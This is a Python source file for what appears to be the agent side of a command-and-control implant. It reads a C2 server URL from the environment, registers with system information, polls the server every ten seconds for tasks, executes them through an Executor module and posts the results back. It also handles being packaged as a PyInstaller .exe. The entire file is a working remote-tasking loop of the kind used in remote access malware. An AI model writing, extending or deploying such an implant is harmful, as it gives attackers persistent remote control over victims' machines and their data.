import httpx
import time
import uuid
import sys
import os
import asyncio

# Add the parent directory or PyInstaller bundle directory to sys.path
if getattr(sys, 'frozen', False):
    # Running in a bundle (.exe)
    bundle_dir = sys._MEIPASS
    sys.path.append(bundle_dir)
else:
    # Running in normal python environment
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shared.schemas import Task

from executor import Executor

SERVER_URL = os.getenv("C2_SERVER_URL", "http://localhost:8000")
AGENT_ID = str(uuid.uuid4())
VERSION = "1.1.0"

async def register():
    # Gather system info for the dashboard
    sys_info = Executor._get_sysinfo().get("info", {})
    
    async with httpx.AsyncClient() as client:
        try:
            params = {
                "agent_id": AGENT_ID,
                "version": VERSION
            }
            response = await client.post(f"{SERVER_URL}/register", params=params, json=sys_info)
            print(f"[*] Registration status: {response.json()}")
        except Exception as e:
            print(f"[!] Registration failed: {e}")

async def poll_tasks():
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(f"{SERVER_URL}/tasks/{AGENT_ID}")
            if response.status_code == 200:
                tasks = response.json()
                for task_data in tasks:
                    task = Task(**task_data)
                    print(f"[*] Received task: {task.type}")
                    
                    from executor import Executor
                    result = Executor.execute(task.type, task.payload)
                    
                    await submit_result(task.id, result)
        except Exception as e:
            print(f"[!] Task polling failed: {e}")

async def submit_result(task_id: str, result: dict):
    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(
                f"{SERVER_URL}/tasks/{AGENT_ID}/results?task_id={task_id}",
                json=result
            )
            print(f"[*] Result submitted: {response.json()}")
        except Exception as e:
            print(f"[!] Result submission failed: {e}")

async def main():
    print(f"[*] Starting agent {AGENT_ID}")
    await register()
    
    while True:
        await poll_tasks()
        await asyncio.sleep(10)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Agent stopped")
